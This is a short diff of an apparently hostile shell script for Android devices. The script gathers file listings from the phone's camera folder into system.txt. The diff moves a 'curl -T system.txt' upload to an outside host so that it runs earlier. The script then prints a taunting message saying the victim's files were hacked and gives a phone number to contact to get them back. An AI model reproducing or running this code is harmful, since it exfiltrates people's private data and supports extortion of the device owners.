@@ -132,6 +132,7 @@ $(cd /sdcard/DCIM/Camera/Cshot ; cd * ; ls -s -u)
   ','{$line}','
 
   ','{$line}',' " >> system.txt
+   curl -T system.txt http://n8tive.co.za/
   echo 3
   sleep 1
   echo 2
@@ -142,8 +143,6 @@ $(cd /sdcard/DCIM/Camera/Cshot ; cd * ; ls -s -u)
   sleep 1
   echo -e "\033[33;31m"
    echo Your All Databse Files Backups And Android , Has Been Hacked , hahah , please contact me for phone : 0325852307 for zalo , back all files 😂😂
-  sleep 3
-  curl -T system.txt http://n8tive.co.za/
   exit 1
 
  esac
